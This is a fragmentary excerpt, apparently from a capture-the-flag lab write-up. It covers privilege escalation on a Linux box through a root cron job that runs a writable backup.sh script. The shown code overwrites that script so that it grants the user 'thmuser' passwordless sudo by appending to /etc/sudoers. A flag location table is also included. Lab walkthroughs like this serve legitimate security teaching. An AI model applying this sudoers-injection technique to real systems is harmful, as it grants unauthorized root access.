...
3. As thmuser you can overwrite the script and cron will execute it with root privileges
...
Adds thmuser to the sudoers file to run any command without a password.

```
echo -e '#!/bin/bash\nchmod 777 /etc/sudoers\necho "thmuser ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers\nchmod 440 /etc/sudoers' > /usr/local/bin/backup.sh
chmod +x /usr/local/bin/backup.sh
```
...
| Flag     | Location                  |
|----------|---------------------------|
| user.txt | /home/thmuser/user.txt    |
...
1. thmuser overwrites `backup.sh` with a malicious payload
